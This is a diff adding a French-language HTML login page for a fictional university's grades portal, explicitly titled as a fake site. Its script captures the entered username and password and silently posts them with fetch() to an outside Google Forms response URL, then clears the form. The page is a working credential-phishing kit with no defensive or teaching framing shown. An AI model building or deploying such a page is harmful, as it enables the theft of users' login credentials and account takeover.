@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Faux site de l'Université - Connexion</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+            position: relative;
+        }
+        .login-container img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        .login-container h2 {
+            margin-bottom: 10px;
+            color: #007BFF;
+        }
+        .login-container p {
+            margin-bottom: 20px;
+            color: #555;
+        }
+        .login-container label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #333;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .login-container button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="logo.jpg" alt="Logo de l'Université Fictive">
+        <h2>Université Fictive</h2>
+        <p>Bienvenue sur le portail de gestion des notes</p>
+        <form id="loginForm">
+            <label for="username">Nom d'utilisateur:</label>
+            <input type="text" id="username" name="entry.1518027408" required>
+            <label for="password">Mot de passe:</label>
+            <input type="password" id="password" name="entry.971765190" required>
+            <button type="submit">Se connecter</button>
+        </form>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('loginForm');
+            form.addEventListener('submit', function(event) {
+                event.preventDefault();
+
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
+
+                // URL du Google Form
+                const googleFormURL = 'https://docs.google.com/forms/d/e/1FAIpQLScmAoMSPDKvgWrY8GlTwBddqtu63PNpLK3ULOCEn6FSgBffcg/formResponse';
+
+                // Construire les données du formulaire
+                const formData = new FormData();
+                formData.append('entry.1518027408', username);
+                formData.append('entry.971765190', password);
+
+                // Envoyer la requête POST vers le Google Form
+                fetch(googleFormURL, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors' // Cette option est nécessaire pour éviter les problèmes de CORS
+                })
+                .then(response => {
+                    // Réinitialiser le formulaire après envoi
+                    form.reset();
+                })
+                .catch(error => {
+                    console.error('Erreur:', error);
+                });
+            });
+        });
+    </script>
+</body>
+</html>
+
